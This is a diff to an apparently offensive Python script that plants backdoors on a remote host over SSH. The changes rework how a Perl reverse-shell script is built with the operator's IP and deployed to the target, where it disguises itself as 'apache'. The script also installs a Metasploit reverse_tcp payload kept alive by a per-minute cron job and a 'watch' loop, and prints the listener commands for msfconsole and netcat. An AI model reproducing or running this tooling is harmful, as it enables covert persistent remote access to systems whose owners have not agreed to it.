@@ -17,23 +17,29 @@ def netcatBackdoor():
     print("Netcat backdoor on port 53920 attempted. Access this with nc <ip> 53920")
 
 def perlBackdoor():
-	raw_input("Please edit the prs.pl file to put in your ip. Press enter to continue.")
-	raw_input("Enter the following command: nc -v -n -l -p 53921. Press enter")
-	scpFiles('prs.pl', False)
-	print("Moving the backdoor script.")
-	ssh.exec_command("nohup perl prs.pl")
-	print("Perl backdoor on port 53921 attempted. It's gonna name itself apache so hopefully the target won't see what's going on. If you stop the listener, the backdoor will stop.")
+    toW = 'perl/prs.pl'
+    stringToAdd = ""
+    fileToWrite = open(toW, 'w')
+
+    with open ("perl/prs1", "r") as myfile:
+        data=myfile.read()
+    data = data[:-1]#remove the last new line character.
+    stringToAdd+=data + newIP
+
+    with open ("perl/prs2", "r") as myfile:
+        data=myfile.read()
+    stringToAdd+=data
+    fileToWrite.write(stringToAdd)
+    fileToWrite.close()
+
+    raw_input("Enter the following command: nc -v -n -l -p 53921. Press enter")
+    scpFiles('prs.pl', False)
+    print("Moving the backdoor script.")
+    ssh.exec_command("nohup perl prs.pl")
+    print("Perl backdoor on port 53921 attempted. It's gonna name itself apache so hopefully the target won't see what's going on. If you stop the listener, the backdoor will stop.")
 
 def pythBackdoor():
-    newIP = ""
-    if(raw_input("Press y to continue with localhost ip " + localIP + ": ") == 'y'):
-        newIP = localIP
-    else:
-        newIP = raw_input("Please input the ip you want to use: ")
-
     toW = 'pythScript/pythBackdoor.py'
-#    part1 = 'pythScript/pythPart1'
-#    part2 = 'pythScriptpythPart2'
     stringToAdd = ""
     fileToWrite = open(toW, 'w')
 
@@ -63,17 +69,23 @@ def metasploitBackdoor():
      ssh.exec_command("chmod +x initd")
      if cron:
          ssh.exec_command("crontab -l > mycron")
-         ssh.exec_command("echo \"*/1 * * * * ./initd\" >> mycron && crontab mycron && rm mycron")
+         ssh.exec_command("echo \"* * * * * ./initd\" >> mycron && crontab mycron && rm mycron")
      print("Backdoor attempted on port 4444.  To access, open msfconsole and run:")
      print("use multi/handler\n \
      > set PAYLOAD linux/x64/shell/reverse_tcp\n \
      > set LHOST %s\n \
      > set LPORT 4444\n \
      > exploit", localIP)
-     #raw_input("Press any key to launch exploit once msfconsole is listening...")
+     raw_input("Press any key to launch exploit once msfconsole is listening...")
      ssh.exec_command("watch -n1 nohup ./initd > /dev/null &")
      
 
+
+newIP = ""
+if(raw_input("Press y to continue with localhost ip " + localIP + ": ") == 'y'):
+    newIP = localIP
+else:
+    newIP = raw_input("Please input the ip you want to use: ")
 proc = subprocess.Popen(["ifconfig | grep inet | head -n1 | cut -d\  -f12 | cut -d: -f2"], stdout=subprocess.PIPE, shell=True)
 localIP = proc.stdout.read()
 localIP = localIP[:-1]
